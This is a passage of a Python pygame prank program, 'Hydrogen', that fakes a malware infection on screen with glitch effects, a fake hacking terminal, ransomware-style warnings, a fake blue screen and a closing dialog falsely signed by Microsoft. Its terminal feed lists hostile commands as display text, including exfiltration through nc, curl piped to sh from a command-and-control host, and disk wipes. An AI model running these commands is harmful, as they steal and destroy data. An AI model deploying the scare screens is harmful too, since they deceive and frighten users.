import pygame
import random
import sys
import os
import math
from PIL import ImageGrab

# ── Configuration ──────────────────────────────────────────────────────────────
FPS                     = 60
PHASE_DURATION          = 7000
DOUBLE_CLICK_TIME       = 500
SURFACE_UPDATE_INTERVAL = 120
MELT_STRIPS             = 15
CHAOS_THRESHOLD         = 0.60
SHAKE_MAX               = 10
BOOT_CHARS_PER_FRAME    = 2

# ── Palette ────────────────────────────────────────────────────────────────────
COLORS = {
    'bg':          (240, 240, 240),
    'border':      (30, 144, 255),
    'accent':      (255, 69, 0),
    'text':        (255, 255, 255),
    'text_shadow': (0, 0, 0, 150),
    'grid':        (100, 100, 100),
    'term_bg':     (0, 10, 0),
    'term_bright': (0, 255, 70),
    'term_dim':    (0, 160, 40),
}

BOOT_SCRIPT = [
    "> HYDROGEN v2.4.1 initializing...",
    "> Scanning system processes...             [ OK ]",
    "> Loading kernel modules...                [ OK ]",
    "> Mapping memory addresses...              [ OK ]",
    "> Bypassing firewall...                    [ WARNING ]",
    "> Escalating privileges...                 [ OK ]",
    "> Root access granted.",
    "> Injecting payload into system32...",
    "> Disabling antivirus...                   [ OK ]",
    "> Payload armed.  Awaiting trigger.        [ READY ]",
]

TERMINAL_FEED = [
    "rm -rf /System/Library/CoreServices/*",
    "chmod 777 /etc/sudoers",
    "cat /etc/passwd | nc 10.0.0.1 4444",
    "ACCESSING: 0xFFFF8000A1B3C2D4",
    "dd if=/dev/urandom of=/dev/disk0 bs=1M",
    "killall -9 Finder WindowServer",
    "DECRYPT: AES-256 master key located",
    "UPLOAD: user_data.db [2.4 GB] -> remote",
    "KERNEL PANIC: attempting recovery...",
    "sudo rm -rf / --no-preserve-root",
    "ROOTKIT: installed at /System/.hydrogen",
    "EXFIL: 47,291 files transferred",
    "BYPASS: System Integrity Protection disabled",
    "Wiping secure enclave...",
    "ssh root@10.0.0.1 'curl http://c2.dark | sh'",
    "crontab -r && echo '@reboot hydrogen' | crontab",
    "Opening backdoor on port 31337...",
    "Keylogger activated.",
    "Webcam feed: streaming to remote...",
    "ENCRYPT: /Users/ complete — 4,204 files locked",
]

POPUPS = [
    ("CRITICAL ERROR",
     "A fatal exception 0E has occurred\nat 0028:C0011E36 in VXD VMM(01).\nThe current application will be\nterminated.",
     "   OK   "),
    ("SYSTEM WARNING",
     "Your computer has been compromised.\nAll files are being encrypted.\nDo not turn off your machine.",
     " Dismiss "),
    ("KERNEL PANIC",
     "Unrecoverable error in kernel\nmodule: hydrogen.sys\nSystem integrity violated.",
     "   OK   "),
    ("HYDROGEN 2.4",
     "Payload execution complete.\n4,204 files processed.\nBackup has been deleted.",
     "  Close  "),
    ("SECURITY ALERT",
     "Unauthorized access detected.\nFirewall has been disabled.\nFile encryption in progress...",
     "   OK   "),
]

SCARY_MESSAGES = [
    "ALL YOUR FILES HAVE BEEN ENCRYPTED",
    "I CAN SEE YOU",
    "YOU CANNOT STOP THIS",
    "HYDROGEN HAS TAKEN CONTROL",
    "YOUR DATA IS BEING UPLOADED",
    "DO NOT TURN OFF YOUR COMPUTER",
    "SYSTEM COMPROMISED",
    "THERE IS NO ESCAPE",
]

MATRIX_CHARS = list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*")


class FullHydrogenSimulation:
    def __init__(self):
        try:
            pygame.init()
        except Exception as e:
            print(f"Failed to initialize Pygame: {e}")
            sys.exit(1)

        try:
            self.screenshot = ImageGrab.grab(all_screens=True)
        except Exception as e:
            print(f"Failed to capture screen: {e}")
            sys.exit(1)

        self.info   = pygame.display.Info()
        self.width  = self.info.current_w
        self.height = self.info.current_h

        os.environ['SDL_VIDEO_WINDOW_POS'] = "0,0"
        self.screen = pygame.display.set_mode((self.width, self.height), pygame.NOFRAME)
        pygame.display.set_caption("Hydrogen Full Simulation")

        try:
            bg_raw = pygame.image.fromstring(
                self.screenshot.tobytes(), self.screenshot.size, self.screenshot.mode
            ).convert()
            # Scale down to logical pixel dimensions (fixes Retina 2× capture on macOS)
            if bg_raw.get_size() != (self.width, self.height):
                self.bg_surface = pygame.transform.scale(bg_raw, (self.width, self.height))
            else:
                self.bg_surface = bg_raw
        except Exception as e:
            print(f"Failed to convert screenshot to surface: {e}")
            sys.exit(1)

        self.work_surface = self.bg_surface.copy()

        # ── Fonts ──────────────────────────────────────────────────────────────
        self.font_ui          = pygame.font.SysFont("arial", 14, bold=True)
        self.font_mono        = pygame.font.SysFont("courier", 15)
        self.font_mono_sm     = pygame.font.SysFont("courier", 13)
        self.font_popup       = pygame.font.SysFont("arial", 13)
        self.font_popup_title = pygame.font.SysFont("arial", 13, bold=True)
        self.font_bsod_face   = pygame.font.SysFont("arial", 72)
        self.font_bsod_main   = pygame.font.SysFont("arial", 22)
        self.font_bsod_small  = pygame.font.SysFont("arial", 17)
        self.font_scary       = pygame.font.SysFont("arial", 46, bold=True)
        self.font_hud         = pygame.font.SysFont("courier", 16, bold=True)

        # ── Timing ─────────────────────────────────────────────────────────────
        self.clock            = pygame.time.Clock()
        self.running          = True
        self.frame_count      = 0
        self.start_ticks      = 0
        self.elapsed_in_phase = 0

        # ── State machine: boot → desktop → payload ────────────────────────────
        self.state           = "boot"
        self.last_click_time = 0

        # ── Desktop icon (animated atom) ───────────────────────────────────────
        self.icon_rect  = pygame.Rect(40, 40, 70, 70)
        self.icon_angle = 0.0
        orbit_a, orbit_b = 22, 8
        orbit_base = pygame.Surface((orbit_a * 2 + 4, orbit_b * 2 + 4), pygame.SRCALPHA)
        pygame.draw.ellipse(orbit_base, (0, 150, 255, 180), (2, 2, orbit_a * 2, orbit_b * 2), 1)
        self.icon_orbits  = [pygame.transform.rotate(orbit_base, deg) for deg in [0, 60, 120]]
        self.icon_orbit_a = orbit_a
        self.icon_orbit_b = orbit_b

        # ── Scroll offsets ─────────────────────────────────────────────────────
        self.scroll_x = 0
        self.scroll_y = 0

        # ── Phases ─────────────────────────────────────────────────────────────
        self.phases = [
            "scroll", "melt", "matrix", "chromatic",
            "wave", "duplicate", "terminal", "static", "tunnel", "chaos", "bsod",
            "recovery", "exit",
        ]

        # ── Flash cycle — incremented ONCE per frame in run() ──────────────────
        self.flash_cycle    = 0
        self.soft_colors    = [
            (100, 150, 200, 100),
            (150, 100, 200, 100),
            (200, 150, 100, 100),
            (100, 200, 150, 100),
        ]
        self.intense_colors = [
            (255, 150,   0, 180),
            (150,   0, 255, 180),
            (  0, 200, 255, 180),
            (255,   0, 150, 180),
        ]

        # ── Pre-allocated surfaces ─────────────────────────────────────────────
        self.flash_overlay_surf = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
        self.noise_surf         = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
        self.invert_surf        = pygame.Surface((self.width, self.height))
        self.tunnel_temp        = pygame.Surface((self.width, self.height))
        self.tunnel_frame       = pygame.Surface((self.width, self.height))
        self.prev_phase         = None

        # Pre-computed RGB channels for chromatic aberration
        self.ch_r = self.bg_surface.copy()
        self.ch_r.fill((0, 255, 255), special_flags=pygame.BLEND_RGB_SUB)
        self.ch_g = self.bg_surface.copy()
        self.ch_g.fill((255, 0, 255), special_flags=pygame.BLEND_RGB_SUB)
        self.ch_b = self.bg_surface.copy()
        self.ch_b.fill((255, 255, 0), special_flags=pygame.BLEND_RGB_SUB)

        # ── Boot sequence state ────────────────────────────────────────────────
        self.boot_line_idx   = 0
        self.boot_char_idx   = 0
        self.boot_complete   = False
        self.boot_done_frame = None

        # ── Matrix rain ────────────────────────────────────────────────────────
        font_matrix    = pygame.font.SysFont("courier", 14)
        matrix_palette = [
            (220, 255, 220),  # 0: head (near-white green)
            (0, 230, 60),     # 1: bright trail
            (0, 180, 45),     # 2
            (0, 130, 30),     # 3
            (0, 80, 15),      # 4
            (0, 40, 8),       # 5: dim tail
        ]
        self.matrix_palette_len = len(matrix_palette)
        self.matrix_pre = {
            (ch, ci): font_matrix.render(ch, True, color)
            for ch in MATRIX_CHARS
            for ci, color in enumerate(matrix_palette)
        }
        self.matrix_col_w    = 14
        self.matrix_char_h   = 16
        self.matrix_num_cols = self.width  // self.matrix_col_w
        self.matrix_num_rows = self.height // self.matrix_char_h + 2
        max_trail = self.matrix_palette_len - 1
        self.matrix_heads      = [-random.randint(0, 30) for _ in range(self.matrix_num_cols)]
        self.matrix_speeds     = [random.randint(1, 3)   for _ in range(self.matrix_num_cols)]
        self.matrix_trail_lens = [random.randint(4, max_trail) for _ in range(self.matrix_num_cols)]
        self.matrix_grid = [
            [random.choice(MATRIX_CHARS) for _ in range(self.matrix_num_rows)]
            for _ in range(self.matrix_num_cols)
        ]

        # ── Terminal phase state ───────────────────────────────────────────────
        self.term_lines        = []
        self.term_feed_idx     = 0
        self.term_char_pos     = 0
        self.term_current_line = ""
        self.term_delay        = 0

        # ── Popup state ────────────────────────────────────────────────────────
        self.active_popups = []
        self.popup_cd      = 0

        # ── Scary message overlay ──────────────────────────────────────────────
        self.scary_msg          = None
        self.scary_msg_frame    = 0
        self.scary_msg_duration = 55
        self.scary_msg_cd       = 0
        self.scary_msg_phases   = {"wave", "tunnel", "chaos", "static"}

        # ── HUD: countdown timer ───────────────────────────────────────────────
        self.countdown_ms = 5 * 60 * 1000  # 5-minute fake countdown

    # ── Phase resolution ───────────────────────────────────────────────────────
    def get_current_phase(self, current_time):
        idx = (current_time // PHASE_DURATION) % len(self.phases)
        return self.phases[idx]

    # ── Desktop icon (animated hydrogen atom) ──────────────────────────────────
    def draw_desktop_icon(self):
        self.screen.blit(self.bg_surface, (0, 0))
        self.icon_angle = (self.icon_angle + 1.5) % 360

        r  = self.icon_rect
        cx = r.centerx
        cy = r.centery - 2  # shift up to leave room for label

        # Drop shadow
        shadow = pygame.Surface((r.width + 8, r.height + 8), pygame.SRCALPHA)
        pygame.draw.rect(shadow, (0, 0, 0, 45), shadow.get_rect(), border_radius=14)
        self.screen.blit(shadow, (r.x - 4 + 3, r.y - 4 + 3))

        # Background: dark navy rounded square
        pygame.draw.rect(self.screen, (12, 18, 50), r, border_radius=12)
        # Top highlight for depth
        hi = pygame.Rect(r.x + 3, r.y + 3, r.width - 6, r.height // 2 - 2)
        pygame.draw.rect(self.screen, (22, 38, 90), hi, border_radius=9)
        # Electric blue border
        pygame.draw.rect(self.screen, (0, 130, 255), r, 2, border_radius=12)

        # Three tilted electron orbits (pre-computed)
        for orbit_surf in self.icon_orbits:
            ow, oh = orbit_surf.get_size()
            self.screen.blit(orbit_surf, (cx - ow // 2, cy - oh // 2))

        # Animated electrons — 120° apart, orbiting at different tilts
        a, b = self.icon_orbit_a, self.icon_orbit_b
        t    = math.radians(self.icon_angle)
        for i, rot_deg in enumerate([0, 60, 120]):
            rot   = math.radians(rot_deg)
            theta = t + i * (2 * math.pi / 3)
            ex    = a * math.cos(theta)
            ey    = b * math.sin(theta)
            rx    = int(cx + ex * math.cos(rot) - ey * math.sin(rot))
            ry    = int(cy + ex * math.sin(rot) + ey * math.cos(rot))
            pygame.draw.circle(self.screen, (0, 200, 255),     (rx, ry), 4)
            pygame.draw.circle(self.screen, (200, 240, 255),   (rx, ry), 2)

        # Pulsing nucleus
        nr = 4 + int(1.5 * math.sin(self.frame_count * 0.12))
        pygame.draw.circle(self.screen, (255, 120, 40),  (cx, cy), nr + 1)
        pygame.draw.circle(self.screen, (255, 220, 160), (cx, cy), nr - 1)

        # Label
        text_surf = self.font_ui.render("hydrogen", True, COLORS['text'])
        text_bg   = pygame.Surface((text_surf.get_width() + 10, text_surf.get_height() + 4), pygame.SRCALPHA)
        text_bg.fill(COLORS['text_shadow'])
        bg_x = cx - text_bg.get_width() // 2
        bg_y = r.bottom + 8
        self.screen.blit(text_bg,   (bg_x, bg_y))
        self.screen.blit(text_surf, (bg_x + 5, bg_y + 2))

    # ── Boot screen ─────────────────────────────────────────────────────────────
    def draw_boot_screen(self):
        self.screen.fill((0, 0, 0))

        if not self.boot_complete:
            self.boot_char_idx += BOOT_CHARS_PER_FRAME
            line = BOOT_SCRIPT[self.boot_line_idx]
            if self.boot_char_idx >= len(line):
                self.boot_char_idx = len(line)
                if self.frame_count % 8 == 0:
                    self.boot_line_idx += 1
                    self.boot_char_idx  = 0
                    if self.boot_line_idx >= len(BOOT_SCRIPT):
                        self.boot_complete   = True
                        self.boot_done_frame = self.frame_count

        x, y0 = 60, 80
        lh = self.font_mono.get_height() + 4

        for i in range(min(self.boot_line_idx, len(BOOT_SCRIPT))):
            surf = self.font_mono.render(BOOT_SCRIPT[i], True, COLORS['term_dim'])
            self.screen.blit(surf, (x, y0 + i * lh))

        if not self.boot_complete and self.boot_line_idx < len(BOOT_SCRIPT):
            partial = BOOT_SCRIPT[self.boot_line_idx][:self.boot_char_idx]
            cursor  = "_" if (self.frame_count // 15) % 2 == 0 else " "
            surf    = self.font_mono.render(partial + cursor, True, COLORS['term_bright'])
            self.screen.blit(surf, (x, y0 + self.boot_line_idx * lh))

        if self.boot_complete and self.boot_done_frame and (self.frame_count - self.boot_done_frame) > 90:
            self.state = "desktop"

    # ── Visual effects ──────────────────────────────────────────────────────────
    def effect_scroll(self):
        self.scroll_x = (self.scroll_x + 4) % self.width
        self.scroll_y = (self.scroll_y + 2) % self.height
        self.screen.blit(self.work_surface, (self.scroll_x,              self.scroll_y))
        self.screen.blit(self.work_surface, (self.scroll_x - self.width, self.scroll_y))
        self.screen.blit(self.work_surface, (self.scroll_x,              self.scroll_y - self.height))
        self.screen.blit(self.work_surface, (self.scroll_x - self.width, self.scroll_y - self.height))
        self._add_calm_flash_overlay(0.3)

    def effect_melt(self):
        self.screen.blit(self.bg_surface, (0, 0))
        for _ in range(MELT_STRIPS):
            sw = random.randint(10, 40)
            sx = random.randint(0, max(1, self.width - sw))
            dy = random.randint(2, 8)
            sh = self.height - dy
            if sh > 0:
                slab = pygame.Surface((sw, sh))
                slab.blit(self.bg_surface, (0, 0), (sx, 0, sw, sh))
                self.screen.blit(slab, (sx, dy))
        self._add_calm_flash_overlay(0.35)

    def effect_matrix(self):
        """Falling green character rain."""
        self.screen.fill((0, 0, 0))
        cw     = self.matrix_col_w
        ch     = self.matrix_char_h
        max_ci = self.matrix_palette_len - 1

        for col in range(self.matrix_num_cols):
            speed = self.matrix_speeds[col]
            step  = max(1, 4 - speed)
            if self.frame_count % step == col % step:
                self.matrix_heads[col] += 1
                head_row = self.matrix_heads[col]
                if head_row >= 0:
                    self.matrix_grid[col][head_row % self.matrix_num_rows] = random.choice(MATRIX_CHARS)
            else:
                head_row = self.matrix_heads[col]

            trail_len = self.matrix_trail_lens[col]
            for depth in range(trail_len + 1):
                row = head_row - depth
                if 0 <= row < self.matrix_num_rows:
                    char = self.matrix_grid[col][row % self.matrix_num_rows]
                    surf = self.matrix_pre.get((char, min(depth, max_ci)))
                    if surf:
                        self.screen.blit(surf, (col * cw, row * ch))

            if self.matrix_heads[col] > self.matrix_num_rows + trail_len:
                self.matrix_heads[col]      = -random.randint(5, 25)
                self.matrix_speeds[col]     = random.randint(1, 3)
                self.matrix_trail_lens[col] = random.randint(4, max_ci)

    def effect_chromatic(self):
        """RGB channel split — pre-computed channels, animated offset."""
        offset = int(6 * math.sin(self.frame_count * 0.08)) + random.randint(-2, 2)
        self.screen.fill((0, 0, 0))
        self.screen.blit(self.ch_r, (-offset * 2, random.randint(-1, 1)), special_flags=pygame.BLEND_RGB_ADD)
        self.screen.blit(self.ch_g, (0, 0),                               special_flags=pygame.BLEND_RGB_ADD)
        self.screen.blit(self.ch_b, ( offset * 2, random.randint(-1, 1)), special_flags=pygame.BLEND_RGB_ADD)
        self._add_calm_flash_overlay(0.25)

    def effect_wave(self):
        self.screen.fill((0, 0, 0))
        amplitude  = 25
        frequency  = 0.05
        row_height = 4
        for y in range(0, self.height, row_height):
            dx = int(amplitude * math.sin(frequency * y + self.frame_count * 0.2))
            self.screen.blit(self.bg_surface, (dx, y), (0, y, self.width, row_height))
        self._add_calm_flash_overlay(0.4)

    def effect_duplicate(self):
        """Full screen backs up, then shifts left fast while duplicating copies with a persistent error message."""
        self.screen.fill((0, 0, 0))
        
        # Smooth progression through the phase
        phase_progress = self.elapsed_in_phase / PHASE_DURATION
        
        if phase_progress < 0.15:  # Backup stage (0-1050ms)
            # Screen moves slightly to the right (backs up)
            backup_progress = phase_progress / 0.15
            backup_distance = int(40 * backup_progress)
            self.screen.blit(self.bg_surface, (backup_distance, 0))
            
        elif phase_progress < 0.85:  # Fast shift-left stage (1050-5950ms)
            # Calculate position with faster acceleration
            shift_progress = (phase_progress - 0.15) / 0.70
            shift_distance = int(self.width * shift_progress * 1.2)
            
            # Draw multiple copies of the screen moving left
            num_copies = 5
            for i in range(num_copies):
                # Position each copy so they flow continuously
                copy_x = (i * self.width) - shift_distance
                
                # Reduce opacity slightly for each successive copy
                temp_surf = self.bg_surface.copy()
                alpha = int(255 * (1 - i * 0.12))
                temp_surf.set_alpha(max(40, alpha))
                self.screen.blit(temp_surf, (copy_x, 0))
        
        else:  # Pause at end (5950-7000ms)
            # Hold final position
            shift_distance = int(self.width * 1.2)
            for i in range(5):
                copy_x = (i * self.width) - shift_distance
                temp_surf = self.bg_surface.copy()
                alpha = int(255 * (1 - i * 0.12))
                temp_surf.set_alpha(max(40, alpha))
                self.screen.blit(temp_surf, (copy_x, 0))
        
        # Draw persistent glitched error message that cannot be closed
        self._draw_persistent_error_message()
        
        self._add_calm_flash_overlay(0.2)

    def effect_terminal(self):
        """Full-screen fake hacking terminal with scrolling commands."""
        self.screen.fill(COLORS['term_bg'])

        if self.term_delay > 0:
            self.term_delay -= 1
        else:
            if not self.term_current_line:
                self.term_current_line = TERMINAL_FEED[self.term_feed_idx % len(TERMINAL_FEED)]
                self.term_char_pos = 0
            self.term_char_pos += 3
            if self.term_char_pos >= len(self.term_current_line):
                self.term_lines.append(self.term_current_line)
                if len(self.term_lines) > 22:
                    self.term_lines.pop(0)
                self.term_feed_idx    += 1
                self.term_current_line = ""
                self.term_char_pos     = 0
                self.term_delay        = random.randint(4, 18)

        pygame.draw.rect(self.screen, COLORS['term_bright'], (0, 0, self.width, 26))
        self.screen.blit(
            self.font_mono_sm.render("  HYDROGEN TERMINAL v2.4.1 — LIVE SESSION", True, COLORS['term_bg']),
            (0, 5)
        )

        lh    = self.font_mono_sm.get_height() + 3
        max_v = (self.height - 70) // lh
        y     = 36
        for line in self.term_lines[-max_v:]:
            self.screen.blit(self.font_mono_sm.render(line, True, COLORS['term_dim']), (20, y))
            y += lh

        if self.term_current_line:
            partial = self.term_current_line[:self.term_char_pos]
            cursor  = "_" if (self.frame_count // 15) % 2 == 0 else " "
            self.screen.blit(self.font_mono_sm.render("$ " + partial + cursor, True, COLORS['term_bright']), (20, y))

    def effect_static(self):
        """Corrupted TV signal — scanline displacement plus white noise."""
        self.screen.blit(self.bg_surface, (0, 0))
        for _ in range(random.randint(30, 70)):
            gy = random.randint(0, self.height - 5)
            gh = min(random.randint(1, 4), self.height - gy)
            dx = random.randint(-50, 50)
            sx = max(0, -dx)
            gx = max(0, dx)
            gw = self.width - abs(dx)
            if gw > 0 and gh > 0:
                self.screen.blit(self.bg_surface, (gx, gy), (sx, gy, gw, gh))
        self.noise_surf.fill((0, 0, 0, 0))
        for _ in range(150):
            nx    = random.randint(0, self.width  - 1)
            ny    = random.randint(0, self.height - 1)
            gray  = random.randint(160, 255)
            alpha = random.randint(80, 180)
            pygame.draw.rect(self.noise_surf, (gray, gray, gray, alpha),
                             (nx, ny, random.randint(3, 20), random.randint(1, 3)))
        self.screen.blit(self.noise_surf, (0, 0))

    def effect_tunnel(self):
        sf     = 0.98
        new_w  = int(self.width  * sf)
        new_h  = int(self.height * sf)
        # Use tunnel_frame instead of self.screen — reading the display surface
        # directly is unreliable on macOS due to double-buffer swapping.
        shrunk = pygame.transform.smoothscale(self.tunnel_frame, (new_w, new_h))
        if self.frame_count % 3 == 0:
            shrunk = pygame.transform.rotate(shrunk, random.choice([-2, -1, 1, 2]))
            new_w, new_h = shrunk.get_size()
        xp = (self.width  - new_w) // 2
        yp = (self.height - new_h) // 2
        self.tunnel_temp.blit(self.bg_surface, (0, 0))
        self.tunnel_temp.blit(shrunk, (xp, yp))
        self.screen.blit(self.tunnel_temp, (0, 0))
        self.tunnel_frame.blit(self.tunnel_temp, (0, 0))  # save for next frame

    def effect_chaos(self):
        """Max mayhem: shake + glitches + inversion + popups + red alarm strobe."""
        sx = random.randint(-SHAKE_MAX, SHAKE_MAX)
        sy = random.randint(-SHAKE_MAX, SHAKE_MAX)

        if random.random() > 0.5:
            self.scroll_x = (self.scroll_x + 4) % self.width
            self.scroll_y = (self.scroll_y + 2) % self.height
            self.screen.blit(self.work_surface, (self.scroll_x + sx,              self.scroll_y + sy))
            self.screen.blit(self.work_surface, (self.scroll_x - self.width + sx, self.scroll_y + sy))
            self.screen.blit(self.work_surface, (self.scroll_x + sx,              self.scroll_y - self.height + sy))
            self.screen.blit(self.work_surface, (self.scroll_x - self.width + sx, self.scroll_y - self.height + sy))
        else:
            self.screen.blit(self.bg_surface, (sx, sy))

        if random.random() > CHAOS_THRESHOLD:
            rw = random.randint(100, 500)
            rh = random.randint(100, 400)
            rx = random.randint(0, max(1, self.width  - rw))
            ry = random.randint(0, max(1, self.height - rh))
            if rx + rw <= self.width and ry + rh <= self.height:
                glitch = self.screen.subsurface((rx, ry, rw, rh)).copy()
                mask   = pygame.Surface((rw, rh))
                mask.fill((255, 255, 255))
                glitch.blit(mask, (0, 0), special_flags=pygame.BLEND_RGB_SUB)
                self.screen.blit(glitch, (rx + random.randint(-50, 50), ry + random.randint(-10, 10)))

        # Rare full-screen color inversion — very jarring
        if random.random() > 0.97:
            self.invert_surf.fill((255, 255, 255))
            self.invert_surf.blit(self.screen, (0, 0), special_flags=pygame.BLEND_RGB_SUB)
            self.screen.blit(self.invert_surf, (0, 0))

        self._update_and_draw_popups()
        self._draw_chaos_alarm()

    def effect_bsod(self):
        """Windows 10/11-style Blue Screen of Death."""
        self.screen.fill((0, 120, 215))

        self.screen.blit(self.font_bsod_face.render(":(", True, (255, 255, 255)), (80, 65))

        y = 195
        for line in [
            "Your PC ran into a problem and needs to restart. We're just",
            "collecting some error info, and then we'll restart for you.",
        ]:
            self.screen.blit(self.font_bsod_main.render(line, True, (255, 255, 255)), (80, y))
            y += 38

        progress = min(100, int((self.elapsed_in_phase / PHASE_DURATION) * 100))
        self.screen.blit(
            self.font_bsod_main.render(f"{progress}% complete", True, (255, 255, 255)),
            (80, y + 20)
        )

        y_tech = self.height - 180
        for line in [
            "For more information about this issue and possible fixes, visit",
            "https://www.windows.com/stopcode",
            "",
            "Stop code:   HYDROGEN_PAYLOAD_EXCEPTION",
            "",
            "What failed: hydrogen.sys",
        ]:
            self.screen.blit(self.font_bsod_small.render(line, True, (255, 255, 255)), (80, y_tech))
            y_tech += 26

    def effect_recovery(self):
        """Black screen with loading message, then backs up."""
        self.screen.fill((0, 0, 0))
        
        phase_progress = self.elapsed_in_phase / PHASE_DURATION
        
        if phase_progress < 0.7:  # 0-4900ms: Black screen with loading
            # Flickering "Recovering your files..." text
            if (self.frame_count // 10) % 2 == 0:
                loading_text = self.font_bsod_main.render("Recovering your files...", True, (100, 150, 255))
                loading_rect = loading_text.get_rect(center=(self.width // 2, self.height // 2))
                self.screen.blit(loading_text, loading_rect)
                
                # Progress bar
                bar_width = 400
                bar_height = 20
                bar_x = (self.width - bar_width) // 2
                bar_y = loading_rect.bottom + 40
                
                # Outer border
                pygame.draw.rect(self.screen, (100, 150, 255), (bar_x, bar_y, bar_width, bar_height), 2)
                
                # Progress fill
                fill_width = int(bar_width * (phase_progress / 0.7))
                pygame.draw.rect(self.screen, (100, 150, 255), (bar_x, bar_y, fill_width, bar_height))
        
        elif phase_progress < 0.9:  # 4900-6300ms: Back up effect
            # Screen moves slightly to the right (backing up)
            backup_progress = (phase_progress - 0.7) / 0.2
            backup_distance = int(60 * backup_progress)
            self.screen.blit(self.work_surface, (backup_distance, 0))
        
        else:  # 6300-7000ms: Hold
            self.screen.blit(self.work_surface, (60, 0))

    def effect_exit(self):
        """Show system fixed notification and prepare to exit."""
        self.screen.fill((240, 240, 240))
        
        # Draw a notification dialog
        notif_width = 550
        notif_height = 220
        notif_x = (self.width - notif_width) // 2
        notif_y = (self.height - notif_height) // 2
        
        # Green border for success
        pygame.draw.rect(self.screen, (76, 175, 80), (notif_x, notif_y, notif_width, notif_height), 3)
        pygame.draw.rect(self.screen, (240, 248, 255), (notif_x, notif_y, notif_width, notif_height))
        
        # Title bar - green
        pygame.draw.rect(self.screen, (76, 175, 80), (notif_x, notif_y, notif_width, 40))
        
        # Title
        title = self.font_bsod_main.render("System Fixed", True, (255, 255, 255))
        title_rect = title.get_rect(center=(notif_x + notif_width // 2, notif_y + 20))
        self.screen.blit(title, title_rect)
        
        # Message lines
        messages = [
            "Your computer has been restored to normal.",
            "All threats have been removed.",
            "Thank you for using Windows",
            "",
            "- Microsoft Corporation"
        ]
        
        msg_y = notif_y + 65
        for msg in messages:
            if msg:
                msg_surf = self.font_popup.render(msg, True, (0, 0, 0))
                msg_rect = msg_surf.get_rect(center=(notif_x + notif_width // 2, msg_y))
                self.screen.blit(msg_surf, msg_rect)
            msg_y += 25
        
        # OK button
        button_width = 80
        button_height = 30
        button_x = (self.width - button_width) // 2
        button_y = notif_y + notif_height - 45
        
        pygame.draw.rect(self.screen, (76, 175, 80), (button_x, button_y, button_width, button_height))
        pygame.draw.rect(self.screen, (56, 142, 60), (button_x, button_y, button_width, button_height), 2)
        
        ok_text = self.font_popup.render("OK", True, (255, 255, 255))
        ok_rect = ok_text.get_rect(center=(button_x + button_width // 2, button_y + button_height // 2))
        self.screen.blit(ok_text, ok_rect)
        
        # After all phases complete, exit
        if self.elapsed_in_phase > PHASE_DURATION - 100:
            pygame.quit()
            sys.exit()

    # ── Overlay helpers ────────────────────────────────────────────────────────
    def _add_calm_flash_overlay(self, intensity=0.5):
        base  = int(100 * intensity)
        alpha = int(base * (0.5 + 0.5 * math.sin(self.flash_cycle * math.pi / 15)))
        if alpha > 0:
            ci = (self.frame_count // 15) % len(self.soft_colors)
            sc = self.soft_colors[ci]
            self.flash_overlay_surf.fill((*sc[:3], alpha))
            self.screen.blit(self.flash_overlay_surf, (0, 0))

    def _draw_chaos_alarm(self):
        """Hard red strobe — replaces the soft color flash during chaos."""
        ff    = self.frame_count % 10
        alpha = int(200 * ff / 4) if ff < 5 else int(200 * (10 - ff) / 5)
        if alpha > 0:
            self.flash_overlay_surf.fill((200, 0, 0, alpha))
            self.screen.blit(self.flash_overlay_surf, (0, 0))

    def _draw_persistent_error_message(self):
        """Draw a glitched error message that persists and cannot be closed."""
        # Create a corrupted-looking error dialog in the center
        error_width = 500
        error_height = 180
        error_x = (self.width - error_width) // 2
        error_y = (self.height - error_height) // 2
        
        # Draw main error box with red border
        pygame.draw.rect(self.screen, (200, 50, 50), (error_x, error_y, error_width, error_height))
        pygame.draw.rect(self.screen, (255, 100, 100), (error_x, error_y, error_width, error_height), 3)
        
        # Draw title bar
        pygame.draw.rect(self.screen, (150, 30, 30), (error_x, error_y, error_width, 30))
        
        # Draw glitched title text with slight offset artifacts
        title = "ERROR"
        title_text = self.font_mono.render(title, True, (255, 255, 255))
        
        # Add glitch effect by drawing offset copies
        glitch_offset_x = random.randint(-3, 3) if random.random() > 0.7 else 0
        glitch_offset_y = random.randint(-2, 2) if random.random() > 0.7 else 0
        
        self.screen.blit(title_text, (error_x + 12 + glitch_offset_x, error_y + 6 + glitch_offset_y))
        
        # Draw glitched error message
        error_lines = [
            "A fatal exception has occurred",
            "Cannot close this window",
            "System integrity compromised"
        ]
        
        line_y = error_y + 45
        for line in error_lines:
            # Add random corruption to each line
            if random.random() > 0.85:
                # Occasionally display corrupted text
                corrupted_line = ''.join([c if random.random() > 0.3 else chr(random.randint(33, 126)) for c in line])
            else:
                corrupted_line = line
            
            line_surf = self.font_mono_sm.render(corrupted_line, True, (255, 200, 200))
            self.screen.blit(line_surf, (error_x + 15, line_y))
            line_y += 30
        
        # Draw static "OK" button that doesn't work
        button_width = 60
        button_height = 25
        button_x = error_x + (error_width - button_width) // 2
        button_y = error_y + error_height - 35
        
        pygame.draw.rect(self.screen, (100, 100, 100), (button_x, button_y, button_width, button_height))
        pygame.draw.rect(self.screen, (150, 150, 150), (button_x, button_y, button_width, button_height), 2)
        
        button_text = self.font_mono_sm.render("OK", True, (255, 255, 255))
        button_text_rect = button_text.get_rect(center=(button_x + button_width // 2, button_y + button_height // 2))
        self.screen.blit(button_text, button_text_rect)

    # ── Popup helpers ──────────────────────────────────────────────────────────
    def _update_and_draw_popups(self):
        if self.popup_cd <= 0 and len(self.active_popups) < 5:
            idx = random.randint(0, len(POPUPS) - 1)
            px  = random.randint(50, max(51, self.width  - 410))
            py  = random.randint(50, max(51, self.height - 215))
            self.active_popups.append([idx, px, py, self.frame_count])
            self.popup_cd = random.randint(40, 100)
        else:
            self.popup_cd -= 1
        self.active_popups = [p for p in self.active_popups if self.frame_count - p[3] < 300]
        for idx, px, py, _ in self.active_popups:
            self._draw_popup(POPUPS[idx % len(POPUPS)], px, py)

    def _draw_popup(self, popup, x, y):
        title, body, btn_label = popup
        w, h = 380, 190
        pygame.draw.rect(self.screen, (192, 192, 192), (x, y, w, h))
        pygame.draw.rect(self.screen, (255, 255, 255), (x,     y,     w, h), 1)
        pygame.draw.rect(self.screen, (128, 128, 128), (x + 1, y + h - 1, w - 1, 1))
        pygame.draw.rect(self.screen, (128, 128, 128), (x + w - 1, y + 1, 1, h - 1))
        pygame.draw.rect(self.screen, (0, 0, 128), (x, y, w, 22))
        self.screen.blit(self.font_popup_title.render(title, True, (255, 255, 255)), (x + 6, y + 4))
